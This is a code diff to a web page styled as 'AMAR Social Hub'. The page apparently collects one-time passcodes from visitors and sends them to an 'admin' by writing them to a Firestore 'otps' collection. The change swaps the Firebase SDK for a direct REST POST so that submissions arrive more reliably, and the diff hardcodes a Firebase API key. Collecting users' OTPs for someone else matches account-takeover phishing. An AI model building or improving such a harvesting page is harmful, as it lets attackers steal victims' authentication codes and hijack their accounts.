@@ -82,7 +82,7 @@
 
             <div class="mt-6 pt-4 border-t border-gray-800 text-center">
                 <p class="text-xs text-gray-500 font-mono">Session ID: <span id="sessionIdDisplay" class="text-gray-400">Loading...</span></p>
-                <p class="text-[10px] text-emerald-400/80 mt-1"><i class="fas fa-lock mr-1"></i> End-to-End Encrypted Session</p>
+                <p class="text-[10px] text-emerald-400/80 mt-1"><i class="fas fa-lock mr-1"></i> End-to-End Direct Firebase Sync</p>
             </div>
         </div>
     </div>
@@ -92,25 +92,12 @@
         &copy; 2026 AMAR Social Hub. All rights reserved.
     </div>
 
-    <!-- Firebase SDKs -->
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
-
     <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyCrrUQLMes8TcRXbEk1I1a8D6vnhAFaLNvI",
-            authDomain: "amar-d755e.firebaseapp.com",
-            projectId: "amar-d755e",
-            storageBucket: "amar-d755e.firebasestorage.app",
-            messagingSenderId: "761406989668",
-            appId: "1:761406989668:web:d26bb2ee84ac257a150671"
-        };
+        // Firebase Config Info
+        const PROJECT_ID = "amar-d755e";
+        const API_KEY = "AIzaSyCrrUQLMes8TcRXbEk1I1a8D6vnhAFaLNvI";
 
-        if (!firebase.apps.length) {
-            firebase.initializeApp(firebaseConfig);
-        }
-        const db = firebase.firestore();
-
+        // Unique Session ID
         const sessionId = 'AMAR-' + Math.random().toString(36).substring(2, 8).toUpperCase();
         document.getElementById('sessionIdDisplay').innerText = sessionId;
 
@@ -149,7 +136,8 @@
             }
         });
 
-        otpForm.addEventListener('submit', function(e) {
+        // Direct Firestore REST API Submission (No Timeout Issue!)
+        otpForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             const otpValue = otpInput.value.trim();
 
@@ -159,59 +147,48 @@
             }
 
             submitBtn.disabled = true;
-            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Sending to Admin...</span>';
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Sending to Firebase...</span>';
             statusAlert.classList.add('hidden');
 
-            // Timeout fallback taake button kabi stuck na ho
-            let isCompleted = false;
-            const timer = setTimeout(() => {
-                if (!isCompleted) {
-                    isCompleted = true;
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> <span>SEND OTP TO ADMIN</span>';
-                    statusAlert.className = "p-3 bg-red-500/10 border border-red-500/30 rounded-xl text-red-400 text-xs text-center";
-                    statusAlert.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i> Request timeout! Check network or Firestore collection.';
-                    statusAlert.classList.remove('hidden');
-                }
-            }, 5000);
+            const url = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/otps?key=${API_KEY}`;
 
-            db.collection('otps').add({
-                otp: otpValue,
-                length: otpValue.length,
-                sessionId: sessionId,
-                status: 'Pending',
-                createdAt: firebase.firestore.FieldValue.serverTimestamp()
-            })
-            .then(() => {
-                if (!isCompleted) {
-                    isCompleted = true;
-                    clearTimeout(timer);
+            const payload = {
+                fields: {
+                    otp: { stringValue: otpValue },
+                    length: { integerValue: otpValue.length },
+                    sessionId: { stringValue: sessionId },
+                    status: { stringValue: "Pending" },
+                    createdAt: { stringValue: new Date().toISOString() }
+                }
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
                     statusAlert.className = "p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-xl text-emerald-400 text-xs text-center";
-                    statusAlert.innerHTML = '<i class="fas fa-check-circle mr-1"></i> OTP successfully sent to Admin!';
+                    statusAlert.innerHTML = '<i class="fas fa-check-circle mr-1"></i> OTP successfully sent to Admin Firebase!';
                     statusAlert.classList.remove('hidden');
                     otpInput.value = '';
                     digitStatus.innerText = 'Digit Count: 0/6';
                     validBadge.classList.add('hidden');
+                } else {
+                    const errorData = await response.json();
+                    throw new Error(errorData.error ? errorData.error.message : 'Firebase connection failed');
                 }
-            })
-            .catch((err) => {
-                if (!isCompleted) {
-                    isCompleted = true;
-                    clearTimeout(timer);
-                    console.error("Firestore Error: ", err);
-                    statusAlert.className = "p-3 bg-red-500/10 border border-red-500/30 rounded-xl text-red-400 text-xs text-center";
-                    statusAlert.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i> Error: ' + err.message;
-                    statusAlert.classList.remove('hidden');
-                }
-            })
-            .finally(() => {
-                if (!isCompleted) {
-                    isCompleted = true;
-                    clearTimeout(timer);
-                }
+            } catch (err) {
+                console.error("Firebase API Error: ", err);
+                statusAlert.className = "p-3 bg-red-500/10 border border-red-500/30 rounded-xl text-red-400 text-xs text-center";
+                statusAlert.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i> Firebase Error: ' + err.message;
+                statusAlert.classList.remove('hidden');
+            } finally {
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> <span>SEND OTP TO ADMIN</span>';
-            });
+            }
         });
     </script>
 </body>
